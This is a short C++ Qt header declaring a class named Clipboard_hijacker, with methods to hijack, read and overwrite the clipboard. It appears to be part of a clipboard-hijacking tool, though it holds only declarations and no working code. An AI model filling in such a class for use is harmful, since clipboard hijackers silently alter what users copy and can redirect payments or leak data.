#ifndef CLIPBOARD_HIJACKER_H
#define CLIPBOARD_HIJACKER_H
#include <QClipboard>


class Clipboard_hijacker : public QObject
{

public:
    void hijack();
    Clipboard_hijacker();
    bool clipboardhasChanged;
    QString getclipboardData();
private slots:
    void clipboardChanged();
    void setClipboard();
private:

};

#endif // CLIPBOARD_HIJACKER_H
